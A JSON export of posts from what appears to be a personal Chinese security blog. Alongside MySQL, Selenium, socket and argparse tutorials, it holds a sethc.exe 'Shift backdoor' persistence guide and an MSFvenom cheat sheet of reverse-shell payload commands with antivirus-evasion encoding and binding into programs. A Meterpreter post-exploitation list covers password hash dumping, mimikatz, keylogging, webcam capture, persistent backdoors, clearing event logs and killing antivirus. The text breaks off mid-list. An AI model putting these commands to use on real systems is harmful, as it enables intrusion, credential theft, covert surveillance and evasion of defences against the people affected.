的安装","slug":"Windows-MySQL-的安装","date":"2017-09-30T06:06:45.000Z","updated":"2018-06-10T03:59:38.612Z","comments":true,"path":"2017/09/30/Windows-MySQL-的安装/","link":"","permalink":"https://damit5.com/2017/09/30/Windows-MySQL-的安装/","excerpt":"第一次在Windows安装MySQL真的是安装得各种无语，遇到各种坑，这次写下来，希望以后不会再犯了！！！","text":"第一次在Windows安装MySQL真的是安装得各种无语，遇到各种坑，这次写下来，希望以后不会再犯了！！！ 12345启动: net start MySQL停止: net stop MySQL卸载: sc delete MySQL 1.下载打开mysql官网下载页面：//dev.mysql.com/downloads/mysql/ 选择相应的版本和平台 下载压缩包，解压 2.配置打开刚刚解压的文件夹，发现里面有my-default.ini配置文件，这个是默认的配置文件，复制一个自己的改名字为my.ini（没有的话自己创建一个） 编写 my.ini 配置以下基本信息：1234567891011121314151617[mysql]# 设置mysql客户端默认字符集default-character-set=utf8 [mysqld]# 设置3306端口port = 3306# 设置mysql的安装目录basedir=D:\\Program Files\\MySQL\\mysql-5.7.19-winx64# 设置mysql数据库的数据的存放目录datadir=D:\\Program Files\\MySQL\\mysql-5.7.19-winx64\\Data# 允许最大连接数max_connections=20# 服务端使用的字符集默认为8比特编码的latin1字符集character-set-server=utf8# 创建新表时将使用的默认存储引擎default-storage-engine=INNODB 3.安装启动mysql用管理员身份打开CMD cd到bin目录 然后执行123mysqld install #出现安装成功即可net start mysql #启动mysql 结果发现在cmd里启动发现没法启动 网上搜索了下发现是5.7版本才有这个问题，要在bin目录下手动初始化data目录 cd到bin目录下先初始化 mysqld --initialize-insecure自动生成无密码的root用户， mysqld --initialize自动生成带随机密码的root用户 这里选择1. mysqld --initialize-insecure 初始化后再运行net start mysql 成功启动mysql .. 4.进入mysql环境配置环境变量 将bin目录加入到环境变量中 1mysql -u root #因为此时没有密码 windows 下设置root密码123456789101112131415161718192021222324252627方法1： 用SET PASSWORD命令首先登录MySQL。格式：mysql&gt; set password for 用户名@localhost = password(&apos;新密码&apos;);例子：mysql&gt; set password for root@localhost = password(&apos;123&apos;);方法2：用mysqladmin格式：mysqladmin -u用户名 -p旧密码 password 新密码例子：mysqladmin -uroot -p123456 password 123方法3：用UPDATE直接编辑user表首先登录MySQL。mysql&gt; use mysql;mysql&gt; update user set password=password(&apos;123&apos;) where user=&apos;root&apos; and host=&apos;localhost&apos;;mysql&gt; flush privileges;方法4：在忘记root密码的时候，可以这样以windows为例：1. 关闭正在运行的MySQL服务。2. 打开DOS窗口，转到mysql\\bin目录。3. 输入mysqld --skip-grant-tables 回车。--skip-grant-tables 的意思是启动MySQL服务的时候跳过权限表认证。4. 再开一个DOS窗口（因为刚才那个DOS窗口已经不能动了），转到mysql\\bin目录。5. 输入mysql回车，如果成功，将出现MySQL提示符 &gt;。6. 连接权限数据库： use mysql; 。6. 改密码：update user set password=password(&quot;123&quot;) where user=&quot;root&quot;;（别忘了最后加分号） 。7. 刷新权限（必须步骤）：flush privileges; 。8. 退出 quit。9. 注销系统，再进入，使用用户名root和刚才设置的新密码123登录。 new APlayer({ element: document.getElementById(\"aplayer11\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } });","categories":[],"tags":[{"name":"其他","slug":"其他","permalink":"https://damit5.com/tags/其他/"}]},{"title":"利用Python Selenium库模拟登陆","slug":"利用Python-Selenium库模拟登陆","date":"2017-09-30T06:04:35.000Z","updated":"2018-06-10T04:00:19.151Z","comments":true,"path":"2017/09/30/利用Python-Selenium库模拟登陆/","link":"","permalink":"https://damit5.com/2017/09/30/利用Python-Selenium库模拟登陆/","excerpt":"Python模拟登陆让不少人伤透脑筋，今天奉上一种万能登陆方法。你无须精通HTML，甚至也无须精通Python，但却能让你成功的进行模拟登陆。本文讲的是登陆所有网站的一种方法，并不局限于微博，仅用其作为例子来讲解。","text":"Python模拟登陆让不少人伤透脑筋，今天奉上一种万能登陆方法。你无须精通HTML，甚至也无须精通Python，但却能让你成功的进行模拟登陆。本文讲的是登陆所有网站的一种方法，并不局限于微博，仅用其作为例子来讲解。 0x01 材料必备 Python环境 selenium库 Chrome XPath Helper 插件（可选） PS:selenium是借助浏览器而运行的，因此需要额外下载一款小型浏览器。本文使用的是Chrome Webdriver 0x02 思路 导入模块，创建webdriver对象 打开登录页面 找到元件传入内容 0x03 正式开始导入selenium库1from selenium import webdriver 明确模拟浏览器在电脑中存放的位置，比如我放在了当前文件目录 用selenium的webdriver方程指明浏览器的路径，同时打开一个浏览器。模拟浏览器有多种可选,比如Firefox, Safari。本次用的是谷歌的模拟浏览器。注意：’.Chome’是大写字母。1driver = webdriver.Chrome(executable_path=&quot;./chromedriver.exe&quot;) 打开网页（本次模拟登陆新浪微博）1driver.get(&apos;https://login.sina.com.cn/signup/signin.php?entry=sso&apos;) 利用XPath Helper 查找元件位置并传入数据123driver.find_element_by_xpath(登陆元件位置).send_keys(&apos;账号&apos;)driver.find_element_by_xpath(密码元件位置).send_keys(&apos;密码&apos;)driver.find_element_by_xpath(登陆按钮).click() 0x04 附上懒人脚本123456789from selenium import webdriverdriver = webdriver.Chrome(executable_path=&quot;./chromedriver.exe&quot;)driver.get(&apos;https://login.sina.com.cn/signup/signin.php?entry=sso&apos;)name = raw_input(&apos;Please input your account number : &apos;)password = raw_input(&apos;Please input your password : &apos;)driver.find_element_by_xpath(r&quot;/html/body/div[@id=&apos;wrap&apos;]/div[@class=&apos;iforgot_bd&apos;]/div[@class=&apos;iforgot_cont&apos;]/div[@class=&apos;i_mod&apos;]/form[@id=&apos;vForm&apos;]/div[@class=&apos;main_cen&apos;]/div[@class=&apos;form_mod&apos;]/ul[@class=&apos;form_list&apos;]/li[@class=&apos;item&apos;][1]/input[@id=&apos;username&apos;]&quot;).send_keys(name)driver.find_element_by_xpath(r&quot;/html/body/div[@id=&apos;wrap&apos;]/div[@class=&apos;iforgot_bd&apos;]/div[@class=&apos;iforgot_cont&apos;]/div[@class=&apos;i_mod&apos;]/form[@id=&apos;vForm&apos;]/div[@class=&apos;main_cen&apos;]/div[@class=&apos;form_mod&apos;]/ul[@class=&apos;form_list&apos;]/li[@class=&apos;item&apos;][2]/input[@id=&apos;password&apos;]&quot;).send_keys(password)driver.find_element_by_xpath(r&quot;/html/body/div[@id=&apos;wrap&apos;]/div[@class=&apos;iforgot_bd&apos;]/div[@class=&apos;iforgot_cont&apos;]/div[@class=&apos;i_mod&apos;]/form[@id=&apos;vForm&apos;]/div[@class=&apos;main_cen&apos;]/div[@class=&apos;form_mod&apos;]/ul[@class=&apos;form_list&apos;]/li[@class=&apos;item&apos;][6]/div[@class=&apos;btn_mod&apos;]/input[@class=&apos;W_btn_a btn_34px&apos;]&quot;).click() 0x05 附加：将cookie传入requests123456req = requests.Session()cookies = wd.get_cookies()for cookie in cookies: req.cookies.set(cookie[&apos;name&apos;],cookie[&apos;value&apos;])后面就可以直接用req访问页面了 new APlayer({ element: document.getElementById(\"aplayer13\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } });","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://damit5.com/tags/Python/"}]},{"title":"Windows Shift 后门","slug":"Windows-Shift-后门","date":"2017-09-30T06:03:19.000Z","updated":"2018-06-10T03:59:53.764Z","comments":true,"path":"2017/09/30/Windows-Shift-后门/","link":"","permalink":"https://damit5.com/2017/09/30/Windows-Shift-后门/","excerpt":"我们都知道，windows系统按5下shift后，windows就执行了system32下的sethc.exe，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。","text":"我们都知道，windows系统按5下shift后，windows就执行了system32下的sethc.exe，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。 偷天换日 :::1.将我们的cmd.exe或者木马后门名字改成sethc.exe，然后替换C:windows\\system32\\sethc.exe程序 如果弹出 “你需要TrustedInstaller提供的权限才能修改此文件” 修改的文件右击 –&gt; 属性 –&gt; 安全 –&gt; 高级 –&gt; 更改所有者 –&gt; 当前用户 –&gt; 确定 –&gt; 重复之前步骤知道高级 –&gt; 编辑权限为完全控制 2.按5下shift键可以调出cmd命令窗口，也可以添加用户 类似程序 :::放大镜 ::: Magnify.exe win 和 + 同时按 讲述人 ::: Narrator.exe win 和 enter 同时按 写在最后 ::: 使用shift后门建议使用win2003去远程连接其他服务器，这样会有登录页面，也才能使用shift后门，其他版本的Windows可能会要你直接在本地输入账户和密码，也就不能使用shift后门 new APlayer({ element: document.getElementById(\"aplayer10\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } });","categories":[],"tags":[{"name":"权限维持","slug":"权限维持","permalink":"https://damit5.com/tags/权限维持/"}]},{"title":"Python socket模块实现简易的通信","slug":"Python-socket模块实现简易的通信","date":"2017-09-30T06:00:16.000Z","updated":"2018-06-10T03:52:06.348Z","comments":true,"path":"2017/09/30/Python-socket模块实现简易的通信/","link":"","permalink":"https://damit5.com/2017/09/30/Python-socket模块实现简易的通信/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer21\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 0×01 思路 编写一个脚本之前，我们都应该YY一下思路，这样写出来的东西才会质量高，速度快。","text":"new APlayer({ element: document.getElementById(\"aplayer21\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 0×01 思路 编写一个脚本之前，我们都应该YY一下思路，这样写出来的东西才会质量高，速度快。 思路 服务端 1.创建一个socket的对象 2.绑定IP和端口 3.设置监听数量 4.开始监听 5.发送数据和接收数据 客户端 1.创建一个socket对象 2.连接IP和端口 3.发送数据和接收数据 0×02 服务端1.创建一个socket的对象1ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 2.绑定IP和端口1234host = &apos;127.0.0.1&apos;port = 4444#注意传入的是元组ss.bind((host,ip)) 3.设置监听数量socket.listen(backlog)监听到socket的连接。backlog参数指定排队连接的最大数量，并且应至少为0；最大值取决于系统（通常为5），最小值被强制为0。1ss.listen(1) 4.开始监听socket.accept()接受连接。套接字必须绑定到一个地址并侦听连接。The return value is a pair (conn, address) where conn is a new socket object usable to send and receive data on the connection, and address is the address bound to the socket on the other end of the connection.1s,addr = ss.accept() 5.接收数据1234567def rec(): while True: data = s.recv(1024) #防止无限的回车 if len(data) == 0: continue print data 6.发送数据123456def sen(): while True: content = raw_input() if len(content) == 0: continue s.send(content) 0×03 客户端1.创建socket对象1c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 2.连接服务器IP和端口12# 注意传入的是元组c.connect((&apos;127.0.0.1&apos;,4444)) 3.接收数据类似服务端 4.发送数据类似服务端 0×04 实例 0×05 参考链接socket官方文档socket官方文档翻译","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://damit5.com/tags/Python/"}]},{"title":"Python argparse 模块的简易使用","slug":"Python-argparse-模块的简易使用","date":"2017-09-30T05:56:49.000Z","updated":"2018-06-10T03:51:39.878Z","comments":true,"path":"2017/09/30/Python-argparse-模块的简易使用/","link":"","permalink":"https://damit5.com/2017/09/30/Python-argparse-模块的简易使用/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer22\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } });","text":"new APlayer({ element: document.getElementById(\"aplayer22\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 0×00 示例123456789101112131415161718192021222324#-*-coding:UTF-8-*-import argparseparse = argparse.ArgumentParser(description=&apos;this is the start show message&apos;, epilog=&apos;this is the stop show message&apos;)#不注释掉的话就必须传入一个参数，导致 --author 选项不带参数使用会报错&apos;&apos;&apos;parse.add_argument(dest=&apos;test&apos;,nargs=&apos;+&apos;,metavar=&apos;test&apos;, help=&apos;this is test&apos;)&apos;&apos;&apos;parse.add_argument(&apos;-p&apos;,&apos;--port&apos;,dest=&apos;port&apos;,metavar=&apos;tgt_port&apos;, help=r&quot;enter the target&apos;s port&quot;)parse.add_argument(&apos;-H&apos;,&apos;--host&apos;,dest=&apos;host&apos;, help=r&quot;enter the target&apos;s host&quot;)parse.add_argument(&apos;--author&apos;,dest=&apos;author&apos;,action=&apos;store_true&apos;, help=&apos;show author&apos;)args = parse.parse_args()print &apos;port: &apos; + str(args.port)print &apos;host: &apos; + str(args.host)if args.author: print &apos;author is damit5&apos; 将上述内容保存为temp.py 运行python temp.py -h123456789101112usage: temp.py [-h] [-p tgt_port] [-H HOST] [--author]this is the start show messageoptional arguments: -h, --help show this help message and exit -p tgt_port, --port tgt_port enter the target&apos;s port -H HOST, --host HOST enter the target&apos;s host --author show authorthis is the stop show message 运行python temp.py -p 123 -H 1.1.1.112port: 123host: 1.1.1.1 运行python temp.py --author123port: Nonehost: Noneauthor is damit5 0×01 编写过程1.创建一个解析器使用argparse的第一步是创建一个ArgumentParser对象 123import argparseargparse.ArgumentParser() ArgumentParser对象会保存把命令行解析成Python数据类型所需要的所有信息。 2.添加参数通过调用add_argument()方法向ArgumentParser添加程序的参数信息。通常情况下，这些信息告诉ArgumentParser如何接收命令行上的字符串并将它们转换成对象。这些信息被保存下来并在调用parse_args()时用到12345678parse.add_argument(&apos;-p&apos;,&apos;--port&apos;,dest=&apos;port&apos;,metavar=&apos;tgt_port&apos;, help=r&quot;enter the target&apos;s port&quot;)parse.add_argument(&apos;-H&apos;,&apos;--host&apos;,dest=&apos;host&apos;, help=r&quot;enter the target&apos;s host&quot;)parse.add_argument(&apos;--author&apos;,dest=&apos;author&apos;,action=&apos;store_true&apos;, help=&apos;show author&apos;) 首先输入指令的名字，比如-p、-H,如果指令没有名字，那么终端输入时没带指令的参数将自动保存在当前属性中 dest是属性，传入进来的参数就是属性所对应的值； metavar相当于在 -h 中显示出来值，如果没有就默认使用dest help就用来输出帮助说明 3.解析参数ArgumentParser通过parse_args()方法解析参数。它将检查命令行，把每个参数转换成恰当的类型并采取恰当的动作。在大部分情况下，这意味着将从命令行中解析出来的属性建立一个简单的 Namespace对象。1args = parse.parse_args() 在脚本中，parse_args()调用一般不带参数，ArgumentParser 将根据sys.argv自动确定命令行参数。 0×02 ArgumentParser 对象1argparse.ArgumentParser(prog=None, usage=None, description=None, epilog=None, parents=[], formatter_class=argparse.HelpFormatter, prefix_chars=&apos;-&apos;, fromfile_prefix_chars=None, argument_default=None, conflict_handler=&apos;error&apos;, add_help=True) 创建一个新的ArgumentParser对象。所有的参数应该以关键字参数传递。下面有对每个参数各自详细的描述，但是简短地讲它们是 prog - 程序的名字（默认：sys.argv[0]） usage - 描述程序用法的字符串（默认：从解析器的参数生成） description - 参数帮助信息之前的文本（默认：空） epilog - 参数帮助信息之后的文本（默认：空） parents - ArgumentParser 对象的一个列表，这些对象的参数应该包括进去 formatter_class - 定制化帮助信息的类 prefix_chars - 可选参数的前缀字符集（默认：‘-‘） fromfile_prefix_chars - 额外的参数应该读取的文件的前缀字符集（默认：None） argument_default - 参数的全局默认值（默认：None） conflict_handler - 解决冲突的可选参数的策略（通常没有必要） add_help - 给解析器添加-h/–help 选项（默认：True） 参数详细解释点我0×03 add_argument()方法1ArgumentParser.add_argument(name or flags...[, action][, nargs][, const][, default][, type][, choices][, required][, help][, metavar][, dest]) 定义应该如何解析一个命令行参数。下面每个参数有它们自己详细的描述，简单地讲它们是： name or flags - 选项字符串的名字或者列表，例如foo 或者-f, –foo。 action - 在命令行遇到该参数时采取的基本动作类型。 nargs - 应该读取的命令行参数数目。 const - 某些action和nargs选项要求的常数值。 default - 如果命令行中没有出现该参数时的默认值。 type - 命令行参数应该被转换成的类型。 choices - 参数可允许的值的一个容器。 required - 该命令行选项是否可以省略（只针对可选参数）。 help - 参数的简短描述。 metavar - 参数在帮助信息中的名字。 dest - 给parse_args()返回的对象要添加的属性名称。 参数详细解释点我0x04 参考链接官方文档官方文档翻译","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://damit5.com/tags/Python/"}]},{"title":"MSFvenom使用总结","slug":"MSFvenom使用总结","date":"2017-09-30T05:54:43.000Z","updated":"2018-06-10T03:47:53.147Z","comments":true,"path":"2017/09/30/MSFvenom使用总结/","link":"","permalink":"https://damit5.com/2017/09/30/MSFvenom使用总结/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer2\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } });","text":"new APlayer({ element: document.getElementById(\"aplayer2\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 0×00 参数介绍Msfvenom是有效载荷生成和编码的组合，它于2015年6月8日取代了msfpayload和msfencode 再开始使用msfvenom前，请先看看它支持的选项： 1msfvenom -h 12-p, --payload #添加载荷payload --payload-options #列出payload选项 载荷这个东西比较多，这个软件就是根据对应的载荷payload生成对应平台下的后门，所以只有选对payload，再填写正确自己的IP，PORT就可以生成对应语言，对应平台的后门了 1-l, --list #查看所有payload、encoder、nops 12-f, --format #输出文件的格式 --help-formats #列出所有文件格式 可执行的格式 ( Executable formats )asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war 需要变换的格式: ( Transform formats )bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript 1-e, --encoder #编码免杀 123-a, --arch #选择架构 --platform #选择平台 --help-platforms #列出可选择的平台 选择架构平台x86 | x64 | x86_64 Platforms:windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe 12-s, --space #生成payload的最大长度，就是文件大小 --encoder-space #生成编码payload的最大长度 1-b, --bad-chars #避免使用的字符 例如：不使用 &apos;\\x00&apos; 1-i, --iterations #编码次数 1c, --add-code #添加自己的shellcode 1-o, --out #文件输出 1-x | -k #将后门捆绑到程序上 0×01 Msfvenom实例普通生成123msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;msfvenom -p windows/meterpreter/reverse_tcp -f exe -o /root/shell.exe 编码处理型123msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt; -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o /root/shell.exe 捆绑1msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -x /root/test.exe -k -f exe -o /root/shell.exe Windows123msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o /root/shell.exeMsfvenom -platform windows -a x86 -p windows/x64/meterpreter/reverse_tcp -f exe -o /root/shell.exe Linux1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf MAC1msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho PHP1msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php Asp1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp Aspx1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f aspx &gt; shell.aspx JSP1msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp War1msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war Bash1msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh Perl1msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl Python1msfvenom -p python/meterpreter/reverser_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py 参考文章How-to-use-msfvenomMSFvenom","categories":[],"tags":[{"name":"Metasploit-Framework","slug":"Metasploit-Framework","permalink":"https://damit5.com/tags/Metasploit-Framework/"}]},{"title":"Meterpreter 常用命令和后渗透","slug":"Meterpreter-常用命令和后渗透","date":"2017-09-30T05:51:58.000Z","updated":"2018-06-10T03:47:11.107Z","comments":true,"path":"2017/09/30/Meterpreter-常用命令和后渗透/","link":"","permalink":"https://damit5.com/2017/09/30/Meterpreter-常用命令和后渗透/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer1\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 整理在一起，用的时候也比较方便","text":"new APlayer({ element: document.getElementById(\"aplayer1\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 整理在一起，用的时候也比较方便 核心命令1234567891011121314151617? #帮助菜单background #将当前会话移动到背景bgkill #杀死一个背景 meterpreter 脚本bglist #提供所有正在运行的后台脚本的列表bgrun #作为一个后台线程运行脚本channel #显示活动频道close #关闭通道exit #终止 meterpreter 会话help #帮助菜单interact #与通道进行交互irb #进入 Ruby 脚本模式migrate #移动到一个指定的 PID 的活动进程 eg:migrate 110quit #终止 meterpreter 会话read #从通道读取数据run #执行以后它选定的 meterpreter 脚本use #加载 meterpreter 的扩展write #将数据写入到一个通道 文件系统命令123456789101112131415cat #读取并输出到标准输出文件的内容cd #更改目录对受害人del #删除文件对受害人download #从受害者系统文件下载edit #用 vim编辑文件getlwd #打印本地目录getwd #打印工作目录lcd #更改本地目录lpwd #打印本地目录ls #列出在当前目录中的文件列表mkdir #在受害者系统上的创建目录pwd #输出工作目录rm #删除文件rmdir #受害者系统上删除目录upload #从攻击者的系统往受害者系统上传文件 网络命令123ipconfig #显示网络接口的关键信息，包括 IP 地址、 等。portfwd #端口转发route #查看或修改受害者路由表 系统命令123456789101112131415clearav #清除了受害者的计算机上的事件日志drop_token #被盗的令牌execute #执行命令getpid #获取当前进程 ID (PID)getprivs #尽可能获取尽可能多的特权getuid #获取作为运行服务器的用户kill #终止指定 PID 的进程ps #列出正在运行的进程reboot #重新启动受害人的计算机reg #与受害人的注册表进行交互rev2self #在受害者机器上调用 RevertToSelf()shell #在受害者计算机上打开一个shellshutdown #关闭了受害者的计算机steal_token #试图窃取指定的 (PID) 进程的令牌sysinfo #获取有关受害者计算机操作系统和名称等的详细信息 用户界面命令123456789enumdesktops #列出所有可访问台式机getdesktop #获取当前的 meterpreter 桌面idletime #检查长时间以来，受害者系统空闲进程keyscan_dump #键盘记录软件的内容转储keyscan_start #启动时与如 Word 或浏览器的进程相关联的键盘记录软件keyscan_stop #停止键盘记录软件screenshot #抓取 meterpreter 桌面的屏幕截图set_desktop #更改 meterpreter 桌面uictl #启用用户界面组件的一些控件 特权升级命令1getsystem #获得系统管理员权限 密码转储命令12345hashdump #抓取哈希密码 (SAM) 文件中的值# 请注意 hashdump 会可以跳过杀毒软件，但现在有两个脚本，都更加隐蔽，”run hashdump”和”run smart_hashdump”。load mimikatz #加载wdigest #读取用户明文密码 维持权限命令1234run persistence -X -i 5 -p &lt;your_port&gt; -r &lt;your_ip&gt; -X 在目标主机上开机自启动-i 不断尝试反向连接的时间间隔 Timestomp 命令1timestomp #修改文件时间戳 其他命令123webcam_list #列举摄像头webcam_snap #拍照wencam_stream #监控视频 脚本 在获得meterpreter的session后，除了meterpreter本身内置的一些基本功能，在/usr/share/metasploit-framework/scripts/meterpreter下面还有很多scripts，提供了很多额外功能，非常好用 我们可以通过 run 脚本名 来进行使用 run 脚本名 -h 可以查看帮助 以下翻译来自Google 原文部分翻译参考 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566arp_scanner.rb #利用arp进行存货主机扫描。autoroute.rb #Meterpreter会话，无需背景当前会话。checkvm.rb #用于检测目标主机是否为虚拟机的脚本。credcollect.rb #收集主机上找到的凭据的脚本，并将其存储在数据库中。domain_list_gen.rb #用于提取域管理员帐户列表以供使用的脚本。dumplinks.rb #从用户最近的文档文件夹和Microsoft Office的Recent Documents文件夹（如果存在）中，Dumplinks解析.lnk文件。.lnk文件包含时间戳，文件位置，包括共享名称，卷序列号等。此信息可能有助于您瞄准其他系统。duplicate.rb #再次产生payload，注入到其他进程或打开新程序并注入其中enum_chrome.rb #从chrome安装中提取数据的脚本。enum_firefox.rb #从Firefox中提取数据的脚本。enum_logged_on_users.rb #用于枚举登录到系统的当前记录的用户和用户的脚本。enum_powershell_env.rb #枚举PowerShell和WSH配置。enum_putty.rb #枚举Putty连接。enum_shares.rb #用于枚举所提供股票的脚本和挂载股票的历史。enum_vmware.rb #枚举VMware产品的VMware配置。event_manager.rb #显示目标系统上的事件日志信息及其配置。file_collector.rb #用于搜索和下载与特定模式匹配的文件的脚本。get_application_list.rb #用于提取已安装应用程序及其版本的列表的脚本。getcountermeasure.rb #用于检测AV，HIPS，第三方防火墙，DEP配置和Windows防火墙配置的脚本。还提供杀死检测到的产品的过程并禁用内置防火墙的选项。get_env.rb #用于提取所有系统和用户环境变量列表的脚本。getfilezillacreds.rb #从Filezilla中提取服务器和凭据的脚本。getgui.rb #启用Windows RDP的脚本。get_local_subnets.rb #根据主机的路由获取本地子网列表。get_pidgen_creds.rb #使用用户名和密码提取配置的服务的脚本。gettelnet.rb #检查是否安装了telnet。get_valid_community.rb #从SNMP获取一个有效的社区字符串。getvncpw.rb #获取VNC密码。hashdump.rb #从SAM获取密码散列。hostedit.rb #将条目添加到Windows主机文件的脚本。keylogrecorder.rb #运行键盘记录器并保存所有按键的脚本。killav.rb #终止几乎每个受害者的防病毒软件。metsvc.rb #删除一台服务器并启动另一台服务器。migrate #将计量器服务移动到另一个进程。multicommand.rb #在Windows 2003，Windows Vista和Windows XP和Windows 2008目标上运行多个命令的脚本。multi_console_command.rb #用于在计量器会话上运行多个控制台命令的脚本。multi_meter_inject.rb #用于注入reverce的脚本tcp Meterpreter有效负载到多个PID的内存中，如果没有提供记事本进程将创建一个Meterpreter有效负载。multiscript.rb #在Meterpreter会话上运行多个脚本的脚本。netenum.rb #在Windows 2003，Windows Vista，Windows 2008和Windows XP上使用本机Windows命令进行ping扫描的脚本。packetrecorder.rb #用于捕获到PCAP文件的数据包的脚本。panda2007pavsrv51.rb #此模块利用Panda Antivirus 2007中的特权升级漏洞。由于不安全的权限问题，本地攻击者可以获得提升的权限。persistence.rb #用于在目标主机上创建持久性后门的脚本。pml_driver_config.rb #利用Hewlett-Packard的PML驱动程序HPZ12中的权限升级漏洞。由于不安全的SERVICE_CHANGE_CONFIG DACL权限，本地攻击者可以获得提升的权限。powerdump.rb #Meterpreter脚本，用于利用纯PowerShell通过注册表项提取用户名和密码哈希。该脚本需要您作为系统运行才能正常工作。目前已经在Server 2008和Windows 7上进行了测试，默认情况下安装PowerShell。prefetchtool.rb #从Windows prefetch文件夹中提取信息的脚本。process_memdump.rb #脚本是基于纸张神经外科与Meterpreter。remotewinenum.rb #此脚本将枚举目标环境中的Windows主机，给定用户名和密码，或使用WMI wmic Windows本机工具运行Meterpeter的凭据。scheduleme.rb #用于自动化最常见的调度任务的脚本。此脚本适用于Windows XP，Windows 2003，Windows Vista和Windows 2008。schelevator.rb #利用Windows Vista / 7/2008 Task Scheduler 2.0特权提升。该脚本利用Stuxnet利用的Task Scheduler 2.0 XML 